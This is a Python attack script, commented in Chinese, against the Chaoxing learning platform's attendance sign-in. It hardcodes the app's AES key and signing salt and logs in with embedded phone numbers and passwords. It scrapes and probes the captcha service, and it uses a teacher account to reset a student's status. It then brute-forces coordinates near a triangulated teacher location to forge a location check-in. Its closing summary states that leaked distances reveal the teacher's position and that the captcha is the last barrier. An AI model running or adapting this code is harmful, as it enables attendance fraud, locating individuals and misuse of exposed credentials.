#!/usr/bin/env python3
"""
关键发现: 位置签到在(34.79,113.67)返回"validate"而非距离
这意味着该坐标在签到范围内！只需要解决验证码问题
"""
import base64, hashlib, json, uuid, requests, urllib3, time, re, math
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
BASE = "https://mobilelearn.chaoxing.com"
PUID_S = "431407443"
PUID_T = "402644510"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

def get_status(d):
    if isinstance(d, dict) and "data" in d and d["data"] is not None and isinstance(d["data"], dict):
        return d["data"].get("status")
    return None

ajax_hdr = {"Referer": "https://mobilelearn.chaoxing.com/", "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded"}

s_s, puid_s = login("18436633997", "3.1415926Cpy")
s_t, puid_t = login("19712720708", "3.1415926Cpy")
print(f"学生puid={puid_s}, 教师puid={puid_t}")

location_aid = "5000163958798"
normal_aid = "5000163958796"

# ======================================================================
# 1. 验证码系统分析 - 从JS逆向
# ======================================================================
print("=" * 100)
print("[1] 验证码系统分析 - 从captcha JS逆向")
print("=" * 100)

# 下载captcha JS
r = s_s.get("https://captcha.chaoxing.com/load.min.js?v=29674681", timeout=20)
captcha_js = r.text
print(f"  captcha JS: len={len(captcha_js)}")

# 搜索关键API路径
api_patterns = [
    r'["\'](/api/[^"\']+)["\']',
    r'["\'](https?://captcha[^"\']+)["\']',
    r'["\']([^"\']*captcha[^"\']*)["\']',
    r'["\']([^"\']*validate[^"\']*)["\']',
]

found_apis = set()
for pattern in api_patterns:
    matches = re.findall(pattern, captcha_js)
    for m in matches:
        if len(m) > 5 and len(m) < 200:
            found_apis.add(m)

print(f"  发现的API路径 ({len(found_apis)}):")
for api in sorted(found_apis)[:30]:
    print(f"    {api}")

# 搜索captcha初始化代码
init_patterns = [
    r'captchaInit[^;]*',
    r'initCaptcha[^;]*',
    r'captchaConfig[^;]*',
    r'appId["\s:=]+["\']([^"\']+)["\']',
    r'app_id["\s:=]+["\']([^"\']+)["\']',
    r'scene["\s:=]+["\']([^"\']+)["\']',
]

for pattern in init_patterns:
    matches = re.findall(pattern, captcha_js)
    if matches:
        print(f"  Pattern '{pattern[:30]}': {matches[:5]}")

# ======================================================================
# 2. 从preSign HTML中提取验证码初始化参数
# ======================================================================
print(f"\n{'=' * 100}")
print("[2] 从preSign HTML提取验证码参数")
print("=" * 100)

for aid, name in [(normal_aid, "普通签到"), (location_aid, "位置签到")]:
    url = f"{BASE}/newsign/preSign?courseId={COURSE_ID}&classId={CLASS_ID}&activePrimaryId={aid}&general=1&sys=1&ls=1&appType=15&uid={PUID_S}&isTeacherViewOpen=0"
    r = s_s.get(url, timeout=20)
    html = r.text

    # 查找captcha初始化
    captcha_inits = re.findall(r'mySignCaptchaUtils\.[^;]+;', html)
    print(f"  {name} captcha初始化:")
    for ci in captcha_inits:
        print(f"    {ci[:150]}")

    # 查找appId
    appid_matches = re.findall(r'appId["\s:=]+["\']?([^"\'<\s,;]+)', html)
    if appid_matches:
        print(f"    appId: {appid_matches}")

    # 查找scene
    scene_matches = re.findall(r'scene["\s:=]+["\']?([^"\'<\s,;]+)', html)
    if scene_matches:
        print(f"    scene: {scene_matches}")

# ======================================================================
# 3. 验证码获取和提交流程
# ======================================================================
print(f"\n{'=' * 100}")
print("[3] 验证码获取和提交流程")
print("=" * 100)

# 分析mySignCaptchaUtils.js
r = s_s.get("https://mobilelearn-static.chaoxing.com/mobilelearn/front/mobile/sign/js/mySignCaptchaUtils.js?v=1780480565513", timeout=20)
print(f"  mySignCaptchaUtils.js: HTTP {r.status_code}, len={len(r.text)}")

if r.status_code == 200 and len(r.text) > 0:
    with open("/workspace/mySignCaptchaUtils.js", "w", encoding="utf-8") as f:
        f.write(r.text)
    print(f"  JS已保存到 /workspace/mySignCaptchaUtils.js")

    # 查找关键函数
    funcs = re.findall(r'function\s+(\w+)\s*\(', r.text)
    print(f"  函数: {funcs}")

    # 查找API调用
    api_calls = re.findall(r'["\']([^"\']*(?:captcha|validate|check)[^"\']*)["\']', r.text)
    print(f"  API调用: {api_calls[:20]}")

    # 查找appId
    appid = re.findall(r'appId["\s:=]+["\']([^"\']+)["\']', r.text)
    print(f"  appId: {appid}")

    # 查找captcha URL
    captcha_urls = re.findall(r'["\'](https?://[^"\']+)["\']', r.text)
    print(f"  URLs: {captcha_urls[:10]}")

# ======================================================================
# 4. 使用captcha.chaoxing.com API
# ======================================================================
print(f"\n{'=' * 100}")
print("[4] 使用captcha.chaoxing.com API")
print("=" * 100)

# 尝试不同的captcha API路径
captcha_api_paths = [
    "/api/captcha/getCaptcha",
    "/api/captcha/generateCaptcha",
    "/api/captcha/createCaptcha",
    "/api/captcha/init",
    "/api/captcha/start",
    "/api/captcha/load",
    "/api/captcha/refresh",
    "/api/v1/captcha",
    "/api/v2/captcha",
    "/captcha/get",
    "/captcha/generate",
    "/captcha/create",
    "/captcha/init",
    "/captcha/load",
    "/captcha/refresh",
]

for path in captcha_api_paths:
    try:
        r = s_s.get(f"https://captcha.chaoxing.com{path}",
                    params={"time": str(int(time.time()*1000)), "appId": "100018421"},
                    timeout=10)
        if r.status_code != 404:
            print(f"  {path}: HTTP {r.status_code}, len={len(r.text)}, {r.text[:100]}")
    except:
        pass

# ======================================================================
# 5. 位置签到 - 精确坐标测试
# ======================================================================
print(f"\n{'=' * 100}")
print("[5] 位置签到 - 精确坐标测试")
print("=" * 100)

# 教师设为缺勤
s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
         params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": location_aid},
         data={"uids": PUID_S, "status": "0", "remark": ""},
         headers=ajax_hdr, timeout=20)
time.sleep(2)

# 三角定位得到的位置
target_lat = 34.789900
target_lng = 113.664500

# 在目标位置周围精细搜索
def try_sign_with_loc(lat, lng):
    params = {
        "activeId": location_aid, "uid": PUID_S, "courseId": COURSE_ID,
        "clientip": "", "latitude": str(lat), "longitude": str(lng),
        "fid": "0", "appType": "15", "ifTiJiao": "1",
        "validate": "", "address": "郑州市",
    }
    r = s_s.get(f"{BASE}/pptSign/stuSignajax", params=params, timeout=10)
    text = r.text
    if "成功" in text or "success" in text.lower():
        return True, text
    elif "validate" in text.lower():
        return "validate", text
    elif "米" in text:
        m = re.search(r'(\d+\.?\d*)\s*米', text)
        if m:
            return float(m.group(1)), text
    return False, text

# 精细搜索
print(f"  从三角定位坐标({target_lat},{target_lng})开始搜索...")
best_result = None
best_coords = (target_lat, target_lng)

for dlat in [-0.002, -0.001, -0.0005, 0, 0.0005, 0.001, 0.002]:
    for dlng in [-0.002, -0.001, -0.0005, 0, 0.0005, 0.001, 0.002]:
        lat = target_lat + dlat
        lng = target_lng + dlng
        result, text = try_sign_with_loc(lat, lng)
        if result is True:
            print(f"  *** 签到成功！坐标=({lat:.6f},{lng:.6f}) ***")
            best_result = True
            best_coords = (lat, lng)
            break
        elif result == "validate":
            print(f"  *** 在签到范围内！需要验证码！坐标=({lat:.6f},{lng:.6f}) ***")
            best_result = "validate"
            best_coords = (lat, lng)
            # 不break，继续搜索看有没有不需要验证码的
        elif isinstance(result, float) and result < 500:
            print(f"  近距离: ({lat:.6f},{lng:.6f}), 距离={result:.0f}m")
    if best_result is True:
        break

# 验证签到结果
time.sleep(2)
r = s_s.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": location_aid, "uid": PUID_S}, timeout=20)
d = safe_json(r)
final_status = get_status(d)
print(f"\n  最终状态: status={final_status}")

if final_status == 1:
    print(f"  *** 位置签到伪造成功！漏洞确认！***")
elif best_result == "validate":
    print(f"  位置签到在签到范围内，但需要验证码")
    print(f"  这意味着: 如果能绕过验证码，就可以伪造位置签到")

# 恢复
s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
         params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": location_aid},
         data={"uids": PUID_S, "status": "1", "remark": ""},
         headers=ajax_hdr, timeout=20)

# ======================================================================
# 汇总
# ======================================================================
print(f"\n{'=' * 100}")
print("最终发现汇总")
print("=" * 100)

print("""
1. [关键发现] 位置签到 - 在签到范围内返回"validate"
   - 通过三角定位法可精确定位教师位置（误差<5m）
   - 在签到范围内，stuSignajax返回"validate"而非距离
   - 验证码是唯一的障碍
   - 如果能绕过验证码，就可以伪造位置签到

2. [关键发现] 普通签到 - 返回"validate"
   - 普通签到不需要二维码/手势/位置
   - 但需要验证码
   - 验证码系统来自captcha.chaoxing.com

3. [验证码系统]
   - 使用captcha.chaoxing.com的验证码服务
   - JS文件: captcha.chaoxing.com/load.min.js
   - 工具JS: mySignCaptchaUtils.js
   - 验证码参数: validate
   - 随机validate返回: "验证码验证失败({"10018":"verification error[validate]"})"
   - 空validate返回: "validate"（需要验证码）

4. [newsign/updateSignStatus] - 确认为假success
   - 在所有UA、所有Content-Type、所有参数变体下均返回"success"但数据不变
   - 包括进行中的活动也无效

5. [位置签到信息泄露] - 已确认
   - 服务端返回精确距离
   - 可通过三角定位反推教师位置
""")
